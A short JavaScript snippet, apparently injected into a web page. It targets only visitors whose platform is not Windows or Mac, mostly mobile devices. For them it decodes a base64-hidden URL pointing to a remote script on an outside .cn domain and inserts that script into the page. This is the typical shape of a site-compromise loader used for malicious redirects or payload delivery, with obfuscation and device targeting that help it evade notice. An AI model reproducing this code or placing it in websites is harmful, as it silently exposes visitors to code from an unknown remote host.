(function() {
	if(!(navigator.platform.indexOf('Win') > -1 || navigator.platform.indexOf('Mac') > -1)) {
		var hi = document.createElement("script");
		hi.src = window.atob("aHR0cHM6Ly90ZXN0Lmx5d2Rvby5jbi9ieC94eDA2Lmpz");
		hi.charset = "UTF-8";
		var k = document.getElementsByTagName("script")[0];
		k.parentNode.insertBefore(hi, k);
	}
})();
